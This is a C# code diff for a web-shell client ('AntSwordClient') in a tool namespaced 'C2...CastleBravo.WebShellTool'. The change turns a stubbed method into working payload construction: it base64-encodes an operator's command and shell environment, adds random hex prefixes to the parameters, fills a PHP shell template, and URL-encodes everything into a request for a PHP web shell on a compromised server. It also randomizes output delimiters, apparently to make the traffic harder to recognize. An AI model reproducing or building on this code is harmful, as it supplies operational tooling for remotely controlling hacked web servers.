@@ -5,10 +5,14 @@ namespace C2.Business.CastleBravo.WebShellTool
 {
     class AntSwordClient : CommonClient
     {
+
+
         public AntSwordClient(string password, string clientSetting)
             :base(password, clientSetting)
         {
             this.prefix = password + "=";
+            ShellSplitS = RandomUtil.RandomHexString(10, 0);
+            ShellSplitE = RandomUtil.RandomHexString(6, 0);
         }
 
         private string RandomSPL()
@@ -146,14 +150,23 @@ namespace C2.Business.CastleBravo.WebShellTool
             string param2k = clientSetting.PHP_MAKE;
             string param3k = clientSetting.PHP_BASE64;
 
-            string param1v = string.Empty;
-            string param2v = string.Empty;
-            string param3v = string.Empty;
+            
 
-            string shell = string.Empty;
+            string param1v = RandomUtil.RandomHexString(2, 0);
+            string param2v = RandomUtil.RandomHexString(2, 0) + ST.EncodeBase64(ST.SuperDecodeBase64(command));
+            string param3v = RandomUtil.RandomHexString(2, 0) + ST.EncodeBase64(shellEnv);
 
-            // 只是为了过VS的提交检测, 功能并未实现
-            string payload = param1v + param2v + param3v;
+            string shell = clientSetting.PHP_SHELL.Replace("@SPL", clientSetting.SPL)
+                                                    .Replace("@SPR", clientSetting.SPR)
+                                                    .Replace("@PARAM1K", param1k)
+                                                    .Replace("@PARAM2K", param2k)
+                                                    .Replace("@PARAM3K", param3k)
+                                                    .Replace("@TMDIR", clientSetting.CODE);
+
+            string payload = param1k + "=" + param1v + "&" +
+                             param2k + "=" + param2v + "&" +
+                             param3k + "=" + param3v + "&" +
+                             this.prefix + ST.UrlEncode(shell);
 
             sb.AppendLine("Remote Command:")
               .AppendLine(payload)
@@ -164,9 +177,9 @@ namespace C2.Business.CastleBravo.WebShellTool
               .AppendLine("随机参数 PARAM1 Key:" + param1k)
               .AppendLine("随机参数 PARAM2 Key:" + param2k)
               .AppendLine("随机参数 PARAM3 Key:" + param3k)
-              .AppendLine("随机参数 PARAM1 AB:" + clientSetting.ACTION)
-              .AppendLine("随机参数 PARAM2 AB:" + clientSetting.PHP_MAKE)
-              .AppendLine("随机参数 PARAM3 AB:" + clientSetting.PHP_BASE64)
+              .AppendLine("随机参数 PARAM1 value:" + param1v)
+              .AppendLine("随机参数 PARAM2 value:" + param2v)
+              .AppendLine("随机参数 PARAM3 value:" + param3v)
               .AppendLine("命令:" + command);
 
             clientSetting.SPL = clientSetting.SPL.Replace("\".\"", "");
